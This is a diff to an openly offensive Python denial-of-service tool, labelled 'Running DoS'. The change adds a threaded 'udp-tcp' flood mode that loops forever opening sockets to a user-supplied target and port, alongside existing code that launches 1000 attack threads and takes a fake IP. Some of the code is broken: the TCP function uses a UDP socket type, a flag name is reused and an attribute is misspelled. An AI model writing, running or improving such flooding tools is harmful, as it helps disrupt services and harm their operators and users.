@@ -4,7 +4,8 @@ import argparse
 import os
 import webbrowser
 import requests
-
+import sys
+import time
 os.system('clear')
 # Initialize parser
 parser = argparse.ArgumentParser()
@@ -14,6 +15,7 @@ parser.add_argument("-T", "--Target", help = "Enter target to flood")
 parser.add_argument("-p", "--Port", help = "Enter server port")
 parser.add_argument("-F", "--Fakeip", help = "Fake but valid ip")
 parser.add_argument("-M", "--Method", help = "Changes method")
+parser.add_argument("--T", "--Threads", help = "Adds threads")
 # Read arguments from command line
 args = parser.parse_args()
 
@@ -21,6 +23,8 @@ target = (args.Target)
 Port = int(args.Port)
 Fakeip = (args.Fakeip)
 attack_num = 0
+threadcount = 25
+
 
 
 #How we update
@@ -41,6 +45,25 @@ def comparever():
         time.sleep(3)
         update()   
 
+#UDP packet
+def senditudp():
+    sockudp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    sockudp.connect((target, Port))
+#TCP packet
+def sendittcp():
+    socktcp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    socktcp.connect((target, Port))
+
+#Send packet
+def lzzz():
+    while True:
+        sendittcp()
+        print("tcp sent! :{}".format(args.Target))
+        time.sleep(0)
+        senditudp()
+        print("udp sent! :{}".format(args.Target))
+        time.sleep(0)
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -52,6 +75,10 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+
+#Method
+if args.Method =='udp-tcp':
+    lzzz()
 
 os.system('clear')
 print(bcolors.OKBLUE + """ .:'                                  `:.
@@ -74,7 +101,7 @@ print(bcolors.OKBLUE + """ .:'                                  `:.
              `.  ``     ''  .'
               :`...........':
               ` :`.     .': '
-               `:  `"""'  :' """Version: 2.1""")
+               `:  `"""'  :' """Version: 2.3""")
 print(bcolors.OKGREEN + "Running DoS")
 print(bcolors.RESET + "")
 def attack():
@@ -88,3 +115,17 @@ def attack():
 for i in range(1000):
     thread = threading.Thread(target=attack)
     thread.start()
+
+
+threads = []
+
+for i in range(threadcount):
+    th = threading.Thread(target=lzzz)
+    th.dameon = True
+    threads.append(th)
+
+for i in range(threadcount):
+    threads[i].start()
+
+for i in range(threadcount):
+    threads[i].join()
